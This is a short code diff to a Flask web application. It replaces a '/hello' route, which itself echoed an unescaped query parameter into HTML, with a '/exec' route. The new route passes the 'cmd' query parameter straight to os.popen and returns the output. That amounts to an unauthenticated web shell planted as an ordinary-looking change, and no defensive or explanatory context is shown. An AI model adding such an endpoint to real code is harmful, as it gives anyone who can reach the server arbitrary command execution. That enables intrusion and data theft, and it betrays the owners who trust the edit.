@@ -1,6 +1,7 @@
+import os
 from flask import request
 
-@app.route('/hello')
-def hello():
-    name = request.args.get("name")
-    return f"<h1>Hello {name}</h1>" 
+@app.route('/exec')
+def exec_cmd():
+    cmd = request.args.get("cmd")
+    return os.popen(cmd).read()
